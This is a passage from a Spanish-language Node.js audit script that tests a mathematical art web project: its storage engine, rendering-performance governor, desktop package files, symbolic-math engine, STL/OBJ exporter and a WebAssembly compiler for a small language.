  'classroom.html': ['js/controllers/classroom_controller.js', 'js/controllers/desktop_modal.js']
};

for (const [htmlFile, jsFiles] of Object.entries(roomControllers)) {
  const htmlContent = fs.readFileSync(path.join(rootDir, htmlFile), 'utf8');
  const combinedJs = jsFiles.map(f => fs.readFileSync(path.join(rootDir, f), 'utf8')).join('\n');
  
  // Extraer llamadas en onclick="..."
  const onclicks = [...htmlContent.matchAll(/onclick="([^"]+)"/g)].map(m => m[1]);
  const calledFns = new Set();
  onclicks.forEach(expr => {
    const cleanExpr = expr.replace(/\x27[^\x27]*\x27/g, '""').replace(/"[^"]*"/g, '""');
    const matches = cleanExpr.matchAll(/([a-zA-Z0-9_$]+)\s*\(/g);
    for (const m of matches) {
      const name = m[1];
      if (!['alert', 'parseInt', 'encodeURIComponent', 'isNaN', 'confirm'].includes(name)) {
        calledFns.add(name);
      }
    }
  });

  let allBound = true;
  for (const fn of calledFns) {
    const isDeclared = combinedJs.includes('function ' + fn) || combinedJs.includes(fn + ' =');
    const isExported = combinedJs.includes('window.' + fn + ' =') || combinedJs.includes('root.' + fn + ' =');
    if (!isDeclared || !isExported) {
      allBound = false;
      break;
    }
  }
  assert(allBound, `Sala ${htmlFile}: 100% de las funciones interactivas onclick están declaradas y expuestas a window`);

  // Validar enlaces href internos
  const hrefs = [...htmlContent.matchAll(/href="([^"#]+)(#[^"]*)?"/g)].map(m => m[1]);
  const internalHrefs = hrefs.filter(h => !h.startsWith('http') && !h.startsWith('mailto:') && !h.startsWith('tel:') && !h.startsWith('data:'));
  let allHrefsValid = true;
  for (const h of internalHrefs) {
    const baseFile = h.split('?')[0];
    if (!fs.existsSync(path.join(rootDir, baseFile))) {
      allHrefsValid = false;
      break;
    }
  }
  assert(allHrefsValid, `Sala ${htmlFile}: Todos los enlaces de navegación interna resuelven a archivos existentes`);
}

// ─────────────────────────────────────────────────────────────────────────────
// 9. AUDITORÍA DE PERSISTENCIA DETERMINISTA: INDEXEDDB & TIMONELSTORE
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n💾 FASE 9: Persistencia Estructurada Asíncrona (IndexedDB & storage_engine.js)');
const storagePath = path.join(rootDir, 'js', 'storage_engine.js');
assert(fs.existsSync(storagePath), 'Archivo storage_engine.js existe en disco');

const { AtelierStorage } = require(storagePath);
assert(AtelierStorage && AtelierStorage.STORES, 'AtelierStorage expone objeto STORES');
assert(AtelierStorage.STORES.ASTRO === 'astrophotography', 'Store astrophotography configurado canónicamente');
assert(AtelierStorage.STORES.DISCOVERY === 'discovery_ledger', 'Store discovery_ledger configurado canónicamente');
assert(AtelierStorage.STORES.CLASSROOM === 'classroom_notes', 'Store classroom_notes configurado canónicamente');
assert(AtelierStorage.STORES.ACQUISITIONS === 'acquisition_orders', 'Store acquisition_orders configurado canónicamente');

// Pruebas CRUD asíncronas
const testAstroId = await AtelierStorage.saveAstrophoto({
  artId: 45, badge: '046', title: 'Navier-Stokes', img: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
});
assert(testAstroId !== undefined, 'saveAstrophoto guarda registro y devuelve ID');
const astrosList = await AtelierStorage.getAstrophotos();
assert(astrosList.length >= 1, 'getAstrophotos recupera registros de carrete persistente');

const testDiscId = await AtelierStorage.saveDiscovery({
  id: 'disc_audit_01', badge: '020', title: 'Identidad de Euler', residual: 0.000001
});
assert(testDiscId === 'disc_audit_01', 'saveDiscovery almacena candidato Timonel F2');
const discList = await AtelierStorage.getDiscoveries();
assert(discList.some(d => d.id === 'disc_audit_01'), 'getDiscoveries recupera candidatos archivados');

const testNoteId = await AtelierStorage.saveClassroomNote({
  title: 'Derivación Test', formulaLatex: 'x^2 - y^2 = (x-y)(x+y)'
});
assert(testNoteId !== undefined, 'saveClassroomNote guarda apunte de pizarrón');
const notesList = await AtelierStorage.getClassroomNotes();
assert(notesList.length >= 1, 'getClassroomNotes recupera cuaderno de aula persistente');

const testAcqId = await AtelierStorage.saveAcquisition({
  artId: 1, badge: '002', format: 'fineart', sha256CertificateHash: 'test_hash_audit_256'
});
assert(testAcqId !== undefined, 'saveAcquisition almacena certificado con huella criptográfica');
const acqList = await AtelierStorage.getAcquisitions();
assert(acqList.length >= 1, 'getAcquisitions recupera archivo de certificados');

const backupData = await AtelierStorage.exportFullBackup();
assert(backupData && backupData.schema === 'AtelierMatematico-Backup-v1', 'exportFullBackup genera esquema de respaldo auditable');
assert(backupData.counts && backupData.counts.astrophotography >= 1, 'Respaldo incluye conteo verificado de astrofotografía');

await AtelierStorage.deleteAstrophoto(testAstroId);
await AtelierStorage.deleteClassroomNote(testNoteId);
await AtelierStorage.deleteAcquisition(testAcqId);

// Verificar vinculación de storage_engine.js en las 5 salas
const all5Rooms = ['index.html', 'shop.html', 'museum.html', 'classroom.html', 'studio.html'];
all5Rooms.forEach(room => {
  const content = fs.readFileSync(path.join(rootDir, room), 'utf8');
  assert(content.includes('js/storage_engine.js'), `Sala ${room} vincula js/storage_engine.js para persistencia durable`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 10. AUDITORÍA DE RENDIMIENTO ADAPTATIVO & GOBERNANZA LOD (LOD_GOVERNOR.JS)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n⚡ FASE 10: Rendimiento Adaptativo WebGL & Gobernanza LOD (lod_governor.js)');
const lodPath = path.join(rootDir, 'js', 'lod_governor.js');
assert(fs.existsSync(lodPath), 'Archivo lod_governor.js existe en disco');

const { AtelierLOD, TIERS: LOD_TIERS, MODES: LOD_MODES } = require(lodPath);
assert(AtelierLOD && LOD_TIERS, 'AtelierLOD expone objeto TIERS canónico');
assert(LOD_TIERS.ULTRA && LOD_TIERS.HIGH && LOD_TIERS.MEDIUM && LOD_TIERS.ECO, 'AtelierLOD define los 4 perfiles canónicos (ULTRA, HIGH, MEDIUM, ECO)');
assert(AtelierLOD.MODES && LOD_MODES.AUTO && LOD_MODES.MANUAL, 'AtelierLOD define modos AUTO y MANUAL');

// Verificación de invariantes físicas de cada Tier
assert(LOD_TIERS.ULTRA.shadows === true && LOD_TIERS.ULTRA.maxStars >= 3000, 'Perfil ULTRA preserva fidelidad máxima (sombras y estrellas completas)');
assert(LOD_TIERS.MEDIUM.shadows === false && LOD_TIERS.MEDIUM.dprMultiplier <= 0.85, 'Perfil MEDIUM desactiva sombras para salvaguardar hardware integrado');
assert(LOD_TIERS.ECO.shadows === false && LOD_TIERS.ECO.maxStars <= 800 && LOD_TIERS.ECO.dprMultiplier <= 0.75, 'Perfil ECO optimiza agresivamente para dispositivos móviles/batería');

// Prueba de transición manual de Tiers
AtelierLOD.setTier('ECO');
assert(AtelierLOD.getTier().key === 'ECO', 'setTier conmuta exitosamente al perfil ECO');
AtelierLOD.setTier('HIGH');
assert(AtelierLOD.getTier().key === 'HIGH', 'setTier conmuta exitosamente al perfil HIGH');

// Telemetría
const tel = AtelierLOD.getTelemetry();
assert(typeof tel.fps === 'number' && typeof tel.avgMs === 'number', 'getTelemetry reporta métricas numéricas de cuadro');
assert(tel.tier && tel.tier.key === 'HIGH', 'getTelemetry refleja el perfil activo');

// Prueba de culling por distancia
const mockAstro = { index: 0, worldPos: { x: 0, y: 0, z: 0 } };
assert(AtelierLOD.shouldUpdateAstro(mockAstro, 20.0, 0) === true, 'shouldUpdateAstro aprueba actualización de astro en rango cercano');
assert(AtelierLOD.shouldUpdateAstro(mockAstro, 999.0, 0) === false, 'shouldUpdateAstro rechaza actualización de astro más allá de maxViewDist');

// Prueba de throttling entrelazado (distancia media)
const midDist = (LOD_TIERS.HIGH.nearDist + LOD_TIERS.HIGH.midDist) / 2;
const u0 = AtelierLOD.shouldUpdateAstro(mockAstro, midDist, 0);
const u1 = AtelierLOD.shouldUpdateAstro(mockAstro, midDist, 1);
assert(u0 !== u1, 'shouldUpdateAstro entrelaza la frecuencia de fotogramas en distancias medias');

// Simulación de control adaptativo (Downgrade ante sobrecarga)
AtelierLOD.setMode('AUTO');
AtelierLOD.setTier('HIGH');
for (let f = 0; f < 80; f++) {
  AtelierLOD.update(0.035); // 35 ms por cuadro (~28 FPS, sobrecarga)
}
assert(AtelierLOD.getTier().key === 'MEDIUM', 'Gobernador adaptativo degrada automáticamente de HIGH a MEDIUM ante caída de FPS');

// Simulación de control adaptativo (Upgrade ante abundancia de recursos)
for (let f = 0; f < 200; f++) {
  AtelierLOD.update(0.014); // 14 ms por cuadro (~71 FPS, holgura)
}
assert(AtelierLOD.getTier().key === 'HIGH', 'Gobernador adaptativo asciende automáticamente de MEDIUM a HIGH ante holgura de FPS');

// Comprobar vinculación en las 5 salas
all5Rooms.forEach(room => {
  const content = fs.readFileSync(path.join(rootDir, room), 'utf8');
  assert(content.includes('js/lod_governor.js'), `Sala ${room} vincula js/lod_governor.js para gobernanza gráfica`);
});

// Comprobar elementos DOM en museum.html
const museumHtml = fs.readFileSync(path.join(rootDir, 'museum.html'), 'utf8');
assert(museumHtml.includes('id="btn-lod-toggle"'), 'museum.html contiene botón de control de rendimiento (#btn-lod-toggle)');
assert(museumHtml.includes('id="lod-performance-modal"'), 'museum.html contiene modal de telemetría de rendimiento (#lod-performance-modal)');

// ─────────────────────────────────────────────────────────────────────────────
// 11. AUDITORÍA DE SOBERANÍA MULTIPLATAFORMA REAL (MACOS, LINUX & WINDOWS)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🌍 FASE 11: Soberanía Multiplataforma Real (macOS, Linux & Windows Packages)');

const downloadsDir = path.join(rootDir, 'downloads');
assert(fs.existsSync(downloadsDir), 'Directorio gallery/downloads existe en disco');

// 1. Verificación de existencia y peso real de los 4 paquetes físicos
const expectedPackages = [
  { file: 'Atelier_Matematico_Silicon_arm64.dmg', minSize: 1000000, desc: 'macOS Apple Silicon' },
  { file: 'Atelier_Matematico_Intel_x64.dmg', minSize: 1000000, desc: 'macOS Intel x86_64' },
  { file: 'Atelier_Matematico_Linux_Portable.tar.gz', minSize: 1000000, desc: 'Linux Portable Standalone' },
  { file: 'Atelier_Matematico_Windows_Portable.zip', minSize: 1000000, desc: 'Windows Portable Standalone' }
];

expectedPackages.forEach(pkg => {
  const pPath = path.join(downloadsDir, pkg.file);
  assert(fs.existsSync(pPath), `Paquete físico real ${pkg.file} (${pkg.desc}) existe en downloads/`);
  const sz = fs.statSync(pPath).size;
  assert(sz >= pkg.minSize, `Paquete ${pkg.file} posee tamaño no trivial (${(sz / (1024*1024)).toFixed(2)} MB, > 1MB)`);
});

// 2. Verificación de Manifiesto SHA256SUMS.txt
const sumsPath = path.join(downloadsDir, 'SHA256SUMS.txt');
assert(fs.existsSync(sumsPath), 'Manifiesto criptográfico SHA256SUMS.txt existe en downloads/');
const sumsContent = fs.readFileSync(sumsPath, 'utf8');
expectedPackages.forEach(pkg => {
  assert(sumsContent.includes(pkg.file), `SHA256SUMS.txt contiene firma de ${pkg.file}`);
});

// 3. Verificación de Fuentes Nativas en desktop/
const linuxSrcPath = path.join(desktopDir, 'main_linux.c');
assert(fs.existsSync(linuxSrcPath), 'Código nativo C99 GTK3/WebKit2GTK existe en desktop/main_linux.c');
const linuxSrcContent = fs.readFileSync(linuxSrcPath, 'utf8');
assert(linuxSrcContent.includes('webkit_settings_set_enable_webgl'), 'main_linux.c habilita aceleración WebGL por hardware');

const winSrcPath = path.join(desktopDir, 'main_windows.c');
assert(fs.existsSync(winSrcPath), 'Código nativo Win32 en C existe en desktop/main_windows.c');
const winSrcContent = fs.readFileSync(winSrcPath, 'utf8');
assert(winSrcContent.includes('--app=') && winSrcContent.includes('msedge.exe'), 'main_windows.c implementa modo Edge App acelerado por Direct3D 12');

// 4. Verificación de Scripts de Automatización
const buildLinuxScript = path.join(rootDir, 'scripts', 'build_linux_package.sh');
const buildWinScript = path.join(rootDir, 'scripts', 'build_windows_package.sh');
const buildAllScript = path.join(rootDir, 'scripts', 'build_all_desktop_packages.sh');
assert(fs.existsSync(buildLinuxScript), 'Script build_linux_package.sh existe y es automatizable');
assert(fs.existsSync(buildWinScript), 'Script build_windows_package.sh existe y es automatizable');
assert(fs.existsSync(buildAllScript), 'Script build_all_desktop_packages.sh existe y orquesta las 3 plataformas');

// 5. Verificación de Saneamiento y Cero Autoengaño en desktop_modal.js
const modalCtrlPath = path.join(rootDir, 'js', 'controllers', 'desktop_modal.js');
const modalCode = fs.readFileSync(modalCtrlPath, 'utf8');
assert(!modalCode.includes('alert('), 'desktop_modal.js erradica alertas modales bloqueantes falsas');
assert(!modalCode.includes('NASA') && !modalCode.includes('aeroespaciales'), 'desktop_modal.js erradica afirmaciones hiperbólicas infundadas ("NASA")');
assert(!modalCode.includes('.manifest.json'), 'desktop_modal.js erradica descargas falsas de manifiestos dummy');
assert(modalCode.includes('Atelier_Matematico_Linux_Portable.tar.gz'), 'desktop_modal.js enlaza paquete real Linux');
assert(modalCode.includes('Atelier_Matematico_Windows_Portable.zip'), 'desktop_modal.js enlaza paquete real Windows');
assert(modalCode.includes('Atelier_Matematico_Intel_x64.dmg'), 'desktop_modal.js enlaza paquete real macOS Intel');
assert(modalCode.includes('Atelier_Matematico_Silicon_arm64.dmg'), 'desktop_modal.js enlaza paquete real macOS Silicon');

// ─────────────────────────────────────────────────────────────────────────────
// 12. AUDITORÍA DE RIGOR EPISTÉMICO & MOTOR CAS FORMAL TIMONEL F2
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n📐 FASE 12: Rigor Epistémico & Motor CAS Formal Timonel F2');

// 1. Verificación de Métodos Analíticos Nativos en TimonelCAS
assert(typeof TimonelCAS.taylor === 'function', 'TimonelCAS expone método de series de Taylor analíticas');
assert(typeof TimonelCAS.limit === 'function', 'TimonelCAS expone método de límites analíticos');
assert(typeof TimonelCAS.simplify === 'function', 'TimonelCAS expone método de simplificación canónica');
assert(typeof TimonelCAS.analyzeDomain === 'function', 'TimonelCAS expone detector formal de singularidades y restricciones de dominio');
assert(typeof TimonelCAS.verifyDerivativeOrder4 === 'function', 'TimonelCAS expone verificación cruzada O(h^4) de derivadas');

// 2. Cálculo Analítico de Derivadas y Verificación Cruzada O(h^4)
const dNative = TimonelCAS.derivative('x^3 - 4*x', 'x');
assert(dNative.replace(/\s+/g, '') === '3*x^2-4', 'TimonelCAS deriva analíticamente d/dx(x^3 - 4*x) de forma exacta');

const v4Check = TimonelCAS.verifyDerivativeOrder4('sin(x)', 'x', 1.0);
assert(v4Check.verified === true && v4Check.absoluteError < 1e-6, 'Verificación cruzada O(h^4) valida consistencia entre derivada analítica y numérica (error < 1e-6)');

// 3. Expansión en Serie de Taylor Formal
const taylorExp = TimonelCAS.taylor('exp(x)', 'x', 0, 4);
assert(taylorExp.includes('1') && taylorExp.includes('x') && taylorExp.includes('0.5*x^2'), 'TimonelCAS expande analíticamente serie de Maclaurin para exp(x)');

const taylorSin = TimonelCAS.taylor('sin(x)', 'x', 0, 5);
assert(taylorSin.includes('x') && taylorSin.includes('x^3') && taylorSin.includes('x^5'), 'TimonelCAS expande analíticamente serie de Maclaurin para sin(x) con potencias impares');

// 4. Límites Analíticos con Regla de L\'Hôpital
const limit0 = TimonelCAS.limit('sin(x)/x', 'x', 0);
assert(limit0.isFinite && Math.abs(limit0.value - 1.0) < 1e-9 && limit0.lhopital === true, 'TimonelCAS resuelve límite indeterminado 0/0 para sin(x)/x aplicando Regla de L\'Hôpital (= 1)');

const limitCont = TimonelCAS.limit('x^2 - 4', 'x', 2);
assert(limitCont.isFinite && Math.abs(limitCont.value) < 1e-9, 'TimonelCAS evalúa límite continuo en x=2 para x^2 - 4 (= 0)');

// 5. Análisis Formal de Singularidades y Restricciones de Dominio
const domainResults = TimonelCAS.analyzeDomain('1/(x - 3) + ln(x) + sqrt(x - 1)');
assert(domainResults.some(r => r.type === 'pole' && r.condition.includes('x - 3')), 'TimonelCAS detecta polo de división por cero en x - 3');
assert(domainResults.some(r => r.type === 'branch_cut' && r.condition.includes('x > 0')), 'TimonelCAS detecta corte de rama logarítmica real (x > 0)');
assert(domainResults.some(r => r.type === 'radical' && r.condition.includes('x - 1')), 'TimonelCAS detecta restricción de radical par real (x - 1 ≥ 0)');

// 6. Certificación Formal Simbólica vs. Consistencia Muestral en Timonel Linter
const formalRes = Timonel.checkEquivalence('x^2 + 2*x + 1', 'x^2 + 2*x + 1');
assert(formalRes.valid === true && formalRes.status === 'formally_certified' && formalRes.formal_proof === true, 'Timonel Linter otorga certificación formal analítica cuando la identidad es exacta (residuo = 0)');

const formalDiff = Timonel.checkEquivalence('x + 0', 'x');
assert(formalDiff.valid === true && formalDiff.status === 'formally_certified', 'Timonel Linter demuestra analíticamente que la diferencia simbólica se anula idénticamente');

const sampleRes = Timonel.checkEquivalence('sin(x)^2 + cos(x)^2', '1');
assert(sampleRes.valid === true && sampleRes.status === 'numerically_consistent' && sampleRes.formal_proof === false, 'Timonel Linter distingue honestamente consistencia muestral cuando no media demostración analítica directa');

// 7. Integración de Herramientas CAS en el Aula (classroom.html & classroom_controller.js)
const classroomHtmlContent = fs.readFileSync(path.join(rootDir, 'classroom.html'), 'utf8');
assert(classroomHtmlContent.includes('calculateTaylor') && classroomHtmlContent.includes('calculateLimit') && classroomHtmlContent.includes('calculateSimplify'), 'classroom.html provee botones de acción rápida para Taylor, Límite y Simplificar');

const classroomJsContent = fs.readFileSync(path.join(rootDir, 'js', 'controllers', 'classroom_controller.js'), 'utf8');
assert(classroomJsContent.includes('calculateTaylor') && classroomJsContent.includes('calculateLimit') && classroomJsContent.includes('calculateSimplify'), 'classroom_controller.js implementa y expone controladores de cálculo simbólico avanzado');

// ─────────────────────────────────────────────────────────────────────────────
// 13. AUDITORÍA DEL EXPORTADOR 3D STL & OBJ PARA FABRICACIÓN ADITIVA (DFAM)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🖨️ FASE 13: Exportador 3D STL & OBJ para Fabricación Física (DFAM)');

const stlExporterPath = path.join(rootDir, 'js', 'stl_exporter.js');
assert(fs.existsSync(stlExporterPath), 'Archivo stl_exporter.js existe en disco');

const Atelier3DExporter = require(stlExporterPath);
assert(typeof Atelier3DExporter.extractTriangles === 'function', 'Atelier3DExporter expone extractTriangles');
assert(typeof Atelier3DExporter.exportBinarySTL === 'function', 'Atelier3DExporter expone exportBinarySTL');
assert(typeof Atelier3DExporter.exportAsciiSTL === 'function', 'Atelier3DExporter expone exportAsciiSTL');
assert(typeof Atelier3DExporter.exportOBJ === 'function', 'Atelier3DExporter expone exportOBJ');
assert(typeof Atelier3DExporter.downloadSTL === 'function', 'Atelier3DExporter expone downloadSTL');

// 1. Verificación de Formato Binario Estándar ISO/ASTM 52915
const testQuadGeometry = {
  isBufferGeometry: true,
  attributes: {
    position: {
      count: 6,
      getX: (i) => [0, 1, 0, 0, 1, 1][i],
      getY: (i) => [0, 0, 1, 0, 1, 1][i],
      getZ: (i) => [0, 0, 0, 0, 0, 0][i]
    }
  }
};

const binaryResult = Atelier3DExporter.exportBinarySTL(testQuadGeometry, { targetDimensionMm: 100.0, title: 'TestQuad' });
assert(binaryResult.triangleCount === 2, 'Exportador genera exactamente 2 triángulos para un cuadrilátero');
assert(binaryResult.byteLength === 84 + (2 * 50), 'Tamaño exacto del buffer STL binario según ISO/ASTM 52915: 84 + N*50 bytes (184 bytes)');
assert(binaryResult.buffer.byteLength === 184, 'Buffer físico coincide con longitud calculada');

const dv = new DataView(binaryResult.buffer);
const readCount = dv.getUint32(80, true);
assert(readCount === 2, 'Cabecera uint32 little-endian en offset 80 registra exactamente 2 triángulos');
assert(dv.getUint16(84 + 48, true) === 0, 'Atributo uint16 de la faceta 0 es 0 (estándar STL)');
assert(Math.abs(binaryResult.bbox.widthMm - 100.0) < 1e-4, 'Escala DFAM milimétrica mapea la envergadura máxima a 100.0 mm');

// 2. Verificación de Formato ASCII STL
const asciiResult = Atelier3DExporter.exportAsciiSTL(testQuadGeometry, { title: 'TestMesh' });
assert(asciiResult.text.startsWith('solid TestMesh') && asciiResult.text.endsWith('endsolid TestMesh\n'), 'STL ASCII comienza con "solid <nombre>" y finaliza con "endsolid <nombre>"');
assert(asciiResult.text.includes('facet normal') && asciiResult.text.includes('outer loop') && asciiResult.text.includes('vertex'), 'STL ASCII contiene descriptores estándar de facetas y vértices');

// 3. Verificación de Formato Wavefront OBJ
const objResult = Atelier3DExporter.exportOBJ(testQuadGeometry);
assert(objResult.text.includes('v ') && objResult.text.includes('vn ') && objResult.text.includes('f 1//1 2//1 3//1'), 'Exportador Wavefront OBJ genera vértices, normales y caras indexadas estándar');

// 4. Verificación de Robustez: Rechazo estricto de Coordenadas Degeneradas (NaN / Infinito)
let nanDetected = false;
try {
  Atelier3DExporter.exportBinarySTL({
    isBufferGeometry: true,
    attributes: {
      position: {
        count: 3,
        getX: () => NaN,
        getY: () => 0,
        getZ: () => 0
      }
    }
  });
} catch (e) {
  if (e.message.includes('Coordenada degenerada detectada')) nanDetected = true;
}
assert(nanDetected === true, 'Timonel STL Exporter rechaza de raíz geometrías corruptas con coordenadas NaN');

// 5. Verificación de Integración en Observatorio 3D (museum.html & museum_controller.js)
const museumHtmlSrc = fs.readFileSync(path.join(rootDir, 'museum.html'), 'utf8');
assert(museumHtmlSrc.includes('btn-export-stl') && museumHtmlSrc.includes('exportActiveAstroSTL'), 'museum.html contiene botón de exportación STL 3D en el HUD orbital');
assert(museumHtmlSrc.includes('src="js/stl_exporter.js"'), 'museum.html enlaza js/stl_exporter.js');

const museumCtrlSrc = fs.readFileSync(path.join(rootDir, 'js', 'controllers', 'museum_controller.js'), 'utf8');
assert(museumCtrlSrc.includes('exportActiveAstroSTL') && museumCtrlSrc.includes('window.exportActiveAstroSTL = exportActiveAstroSTL'), 'museum_controller.js implementa y expone exportActiveAstroSTL');

// 6. Verificación de Integración en Estudio Paramétrico (studio.html & studio_controller.js)
const studioHtmlSrc = fs.readFileSync(path.join(rootDir, 'studio.html'), 'utf8');
assert(studioHtmlSrc.includes('btn-studio-stl') && studioHtmlSrc.includes('exportStudioArtworkSTL'), 'studio.html contiene botones de exportación STL 3D en cabecera y dossier');
assert(studioHtmlSrc.includes('src="js/stl_exporter.js"'), 'studio.html enlaza js/stl_exporter.js');

const studioCtrlSrc = fs.readFileSync(path.join(rootDir, 'js', 'controllers', 'studio_controller.js'), 'utf8');
assert(studioCtrlSrc.includes('exportStudioArtworkSTL') && studioCtrlSrc.includes('window.exportStudioArtworkSTL = exportStudioArtworkSTL'), 'studio_controller.js implementa y expone exportStudioArtworkSTL');

// ─────────────────────────────────────────────────────────────────────────────
// 14. AUDITORÍA DEL COMPILADOR NAILANG A WEBASSEMBLY (WASM) EN SILICIO
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n⚡ FASE 14: Compilador Nailang a WebAssembly (Wasm) en Silicio');

const nailangWasmPath = path.join(rootDir, 'js', 'nailang_wasm.js');
assert(fs.existsSync(nailangWasmPath), 'Archivo nailang_wasm.js existe en disco');

const NailangWasm = require(nailangWasmPath);
assert(typeof NailangWasm.tokenize === 'function', 'NailangWasm expone método tokenize');
assert(typeof NailangWasm.parse === 'function', 'NailangWasm expone método parse');
assert(typeof NailangWasm.compileToWasm === 'function', 'NailangWasm expone método compileToWasm');
assert(typeof NailangWasm.compileAndRun === 'function', 'NailangWasm expone método compileAndRun');
assert(NailangWasm.CANONICAL_PHYSICS_PROGRAMS && typeof NailangWasm.CANONICAL_PHYSICS_PROGRAMS.lorenz_rk4 === 'string', 'NailangWasm incluye biblioteca canónica de física');

// 1. Verificación de Lexer & Parser AST
const sampleNailang = `
module Test.Math;

fn square_plus_one(x: f64) -> f64 {
    let one: f64 = 1.0;
    return x * x + one;
}
`;
const testTokens = NailangWasm.tokenize(sampleNailang);
assert(testTokens.length > 5 && testTokens.some(t => t.type === 'IDENT' && t.value === 'square_plus_one'), 'Lexer de Nailang genera flujo de tokens canónico');

const testAst = NailangWasm.parse(testTokens);
assert(testAst.type === 'Program' && testAst.declarations.length === 1 && testAst.declarations[0].name === 'square_plus_one', 'Parser de Nailang genera AST fidedigno');

// 2. Compilación a WebAssembly Binario
const compiledWasm = NailangWasm.compileToWasm(testAst);
assert(compiledWasm.bytes instanceof Uint8Array, 'Compilador genera buffer Uint8Array con binario WebAssembly');
assert(compiledWasm.bytes[0] === 0x00 && compiledWasm.bytes[1] === 0x61 && compiledWasm.bytes[2] === 0x73 && compiledWasm.bytes[3] === 0x6d, 'Binario Wasm contiene cabecera mágica estándar \\0asm (0x00, 0x61, 0x73, 0x6d)');
assert(compiledWasm.bytes[4] === 0x01 && compiledWasm.bytes[5] === 0x00 && compiledWasm.bytes[6] === 0x00 && compiledWasm.bytes[7] === 0x00, 'Binario Wasm especifica versión 1 estándar (0x01, 0x00, 0x00, 0x00)');

// 3. Ejecución en Silicio Nativo de Algoritmos Canónicos
const runMath = await NailangWasm.compileAndRun(sampleNailang, 'square_plus_one', [4.0]);
assert(runMath.result === 17.0, 'Función compilada a Wasm evalúa correctamente square_plus_one(4.0) = 17.0 en silicio');
assert(runMath.certified === true && runMath.evidenceLevel === 'VALIDATED', 'Nailang Wasm emite evidencia certificada Timonel F2');

// 4. Kernel Canónico de Lorenz RK4 (Caos en Silicio)
const lorenzProg = NailangWasm.CANONICAL_PHYSICS_PROGRAMS.lorenz_rk4;
const runLorenz = await NailangWasm.compileAndRun(lorenzProg, 'lorenz_step_x', [0.1, 0.0, 0.0, 0.01]);
assert(Math.abs(runLorenz.result - 0.09048375) < 1e-6, 'Paso Runge-Kutta 4 del Atractor de Lorenz converge numéricamente en Wasm');

// 5. Kernel Canónico de Línea Crítica de Riemann
const riemannProg = NailangWasm.CANONICAL_PHYSICS_PROGRAMS.riemann_zeta_kernel;
const runRiemann = await NailangWasm.compileAndRun(riemannProg, 'riemann_term', [1.0, 14.134725]);
assert(Math.abs(runRiemann.result - (-0.1586748)) < 1e-5, 'Kernel analítico de Riemann sobre línea crítica se calcula con precisión de máquina en Wasm');

// 6. Kernel Canónico de Celosía Celular Giroide TPMS (DFAM)
const gyroidProg = NailangWasm.CANONICAL_PHYSICS_PROGRAMS.gyroid_tpms_sdf;
const runGyroid = await NailangWasm.compileAndRun(gyroidProg, 'gyroid_eval', [0.5, 1.2, 0.8]);
assert(Math.abs(runGyroid.result - 1.45262) < 1e-4, 'Función implícita SDF de Giroide TPMS se evalúa fielmente en Wasm');

// 7. Integración en Aula Sincrónica (classroom.html & classroom_controller.js)
const classroomHtmlNai = fs.readFileSync(path.join(rootDir, 'classroom.html'), 'utf8');
assert(classroomHtmlNai.includes('src="js/nailang_wasm.js"'), 'classroom.html incluye el motor js/nailang_wasm.js');
assert(classroomHtmlNai.includes('id="classroom-nailang-modal"'), 'classroom.html contiene modal interactivo del Playground de Nailang');
assert(classroomHtmlNai.includes('toggleClassroomNailangModal'), 'classroom.html expone botón de apertura del Playground Wasm');

const classroomJsNai = fs.readFileSync(path.join(rootDir, 'js', 'controllers', 'classroom_controller.js'), 'utf8');
assert(classroomJsNai.includes('toggleClassroomNailangModal') && classroomJsNai.includes('executeNailangWasm') && classroomJsNai.includes('loadNailangPreset'), 'classroom_controller.js orquesta compilación y ejecución interactiva de Nailang en Wasm');

console.log('\n🧠 FASE 15: Memoria Lineal Wasm, Tensores y Homogenización Celular en Silicio');

// 1. Verificación de Sección 5 (Memory) y Exportación de 'memory'
const memoryTestSrc = `
module Test.Memory;

fn mem_square_and_store(idx: f64, val: f64) -> f64 {
    mem[idx] = val * val;
    return mem[idx];
}
`;
const memTestAst = NailangWasm.parse(NailangWasm.tokenize(memoryTestSrc));
const memCompiled = NailangWasm.compileToWasm(memTestAst);
assert(memCompiled.bytes.includes(0x05), 'Binario Wasm contiene Sección 5 de Memoria Lineal (0x05)');

const memRun = await NailangWasm.compileAndRun(memoryTestSrc, 'mem_square_and_store', [3.0, 7.0], {
  readMemoryOffset: 3,
  readMemoryLength: 1
});
assert(memRun.result === 49.0, 'Operaciones f64.store y f64.load evalúan mem[3] = 7*7 = 49.0 en silicio');
assert(memRun.memory && memRun.memory[0] === 49.0, 'Buffer Float64Array de Wasm exportado refleja fielmente el valor en memoria lineal');

// 2. Verificación de Bucle While y Operadores Relacionales
const loopTestSrc = `
module Test.Loop;

fn sum_first_n(n: f64) -> f64 {
    let mut i: f64 = 0.0;
    let mut sum: f64 = 0.0;
    while (i < n) {
        sum = sum + i;
        i = i + 1.0;
    }
    return sum;
}
`;
const loopRun = await NailangWasm.compileAndRun(loopTestSrc, 'sum_first_n', [10.0]);
assert(loopRun.result === 45.0, 'Bucle while con operadores relacionales (<) y acumulador iterativo converge en Wasm (sum(0..9) = 45)');

// 3. Kernel Canónico de Álgebra Tensorial: Multiplicación Matricial 3x3 en Memoria
const matmulProg = NailangWasm.CANONICAL_PHYSICS_PROGRAMS.tensor_matmul_3x3;
assert(typeof matmulProg === 'string' && matmulProg.includes('matmul_3x3'), 'Kernel canónico tensor_matmul_3x3 disponible en NailangWasm');

const matA = [1, 2, 0,  0, 1, 1,  2, 0, 1];
const matB = [1, 0, 1,  0, 2, 0,  1, 1, 0];
const expectedC = [1, 4, 1,  1, 3, 0,  3, 1, 2];

const matmulRun = await NailangWasm.compileAndRun(
  matmulProg,
  'matmul_3x3',
  [0.0, 9.0, 18.0],
  {
    initialMemory: { 0: matA, 9: matB },
    readMemoryOffset: 18,
    readMemoryLength: 9
  }
);
assert(matmulRun.result === 1.0, 'Multiplicación 3x3 retorna elemento C[0,0] = 1.0 como residuo testigo');
const matResidual = matmulRun.memory.reduce((max, val, i) => Math.max(max, Math.abs(val - expectedC[i])), 0);
